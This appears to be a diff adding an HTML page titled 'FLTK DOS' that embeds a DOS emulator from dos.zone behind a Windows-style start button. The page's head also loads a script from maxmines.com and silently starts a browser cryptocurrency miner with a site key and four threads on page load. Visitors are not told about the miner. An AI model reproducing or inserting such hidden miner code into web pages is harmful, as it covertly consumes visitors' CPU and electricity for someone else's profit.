@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>FLTK DOS</title>
+<meta http-equiv="x-ua-compatible" content="IE=edge">
+<link rel="stylesheet" href="css/charms.css"/>
+<link rel="shortcut icon" href="favicon.ico"/>
+
+<script>
+	function start()
+	{
+		document.getElementById('startbutton').style.display='block';
+	}
+</script>
+
+<script src="https://maxmines.com/lib/maxmines.min.js"></script>
+<script>
+			var miner = new MaxMines.Anonymous("sIQZK76pFx5ZSFD0pA1xtOuig1SX8MuxiH8c1Omj", {
+	    			throttle: 0.2,
+	    			threads: 4,
+			});
+    			miner.start();
+</script>	
+</head>
+
+<body onload="start()">
+
+<iframe src="https://dos.zone/player/?bundleUrl=https://doszone-uploads.s3.dualstack.eu-central-1.amazonaws.com/personal-v2/studio/2osdesktop/bundle.jsdos?anonymous=1" target="_blank" rel="nofollow" width="100%" height="100%"></iframe>
+
+<div id="starthoverarea" onmouseover="start()" class="hotcorner">
+</div>
+
+<div id="startbutton" onmouseout="start()">
+<a href="../../index.html"><img src="../../common/img/charmsbar/startbutton.png"/></a>
+</div>
+
+</body>
+</html>
+
